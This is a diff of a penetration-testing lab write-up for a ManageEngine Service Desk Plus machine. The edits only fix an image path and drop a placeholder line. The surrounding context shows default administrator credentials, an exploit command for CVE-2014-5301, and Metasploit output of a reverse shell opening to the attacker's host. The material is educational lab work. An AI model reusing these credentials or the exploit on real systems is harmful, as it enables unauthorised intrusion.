@@ -58,7 +58,7 @@ Nmap done: 1 IP address (1 host up) scanned in 14.25 seconds
 ## default credentials
 Googling for standard credentials of `ManageEngine Service Desk Plus` shows that `administrator:administrator` is set as default.
 
-![default credentials](images/helpdesk1.png)
+![default credentials](/images/helpdesk1.png)
 
 > Default credentials are working here!
 {: .prompt-info }
@@ -125,7 +125,6 @@ $ python3 CVE-2014-5301.py 192.168.62.43 8080 administrator administrator shell.
 
 ### check for meterpreter session
 ```bash
-...
 [*] Started reverse TCP handler on 192.168.62.200:4444 
 [*] Sending stage (58060 bytes) to 192.168.62.43
 [*] Meterpreter session 1 opened (192.168.62.200:4444 -> 192.168.62.43:49182 ) at 2022-01-03 11:58:12 -0500
